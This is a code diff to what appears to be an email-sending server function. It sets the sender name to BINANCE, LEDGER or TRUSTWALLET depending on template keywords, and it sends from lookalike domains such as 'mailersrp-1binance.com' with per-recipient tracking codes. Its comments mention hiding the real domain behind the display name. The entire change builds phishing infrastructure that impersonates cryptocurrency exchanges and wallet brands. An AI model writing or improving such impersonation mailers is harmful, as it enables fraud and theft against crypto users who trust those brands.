@@ -165,22 +165,29 @@ const handler = async (req: Request): Promise<Response> => {
     // Simple domain selection - use domain1 by default, domain2 if explicitly set
     const emailPreference = (commercialData?.email_domain_preference || domain || 'domain1')?.toLowerCase();
     
-    // Determine sender name based on template content
+    // Determine brand name based on template content - use uppercase brand names only
     const templateContent = (subject || content || '').toLowerCase();
-    const isBinanceTemplate = templateContent.includes('binance');
-    const emailSenderName = isBinanceTemplate ? 'Binance Support' : 'Trust Wallet';
+    let displayName = 'TRUSTWALLET'; // Default brand
     
-    // Set domain and API key - simple mapping
+    if (templateContent.includes('binance')) {
+      displayName = 'BINANCE';
+    } else if (templateContent.includes('ledger')) {
+      displayName = 'LEDGER';
+    } else if (templateContent.includes('trust') || templateContent.includes('wallet')) {
+      displayName = 'TRUSTWALLET';
+    }
+    
+    // Set domain and API key - use only display name without domain exposure
     let resendApiKey = '';
     let fromDomain = '';
     let sendMethod = 'resend'; // Always resend now
     
     if (emailPreference === 'domain2') {
-      fromDomain = `${emailSenderName} <do_not_reply@mailersrp-2binance.com>`;
+      fromDomain = `${displayName} <support@mailersrp-2binance.com>`;
       resendApiKey = Deno.env.get('RESEND_API_KEY_DOMAIN2') || Deno.env.get('RESEND_API_KEY') || '';
     } else {
       // Default to domain1 for everything else (including alias)
-      fromDomain = `${emailSenderName} <do_not_reply@mailersrp-1binance.com>`;
+      fromDomain = `${displayName} <support@mailersrp-1binance.com>`;
       resendApiKey = Deno.env.get('RESEND_API_KEY') || '';
     }
     
@@ -565,7 +572,7 @@ const handler = async (req: Request): Promise<Response> => {
     // Log email sending attempt
     console.log("Sending email to:", to, "with tracking code:", trackingCode);
     console.log("Server IP used:", currentServerIp);
-    console.log("Sender name:", emailSenderName);
+    console.log("Sender name:", displayName);
     console.log("Send method:", sendMethod);
 
     // Send ONLY via Resend - no PHP/alias support
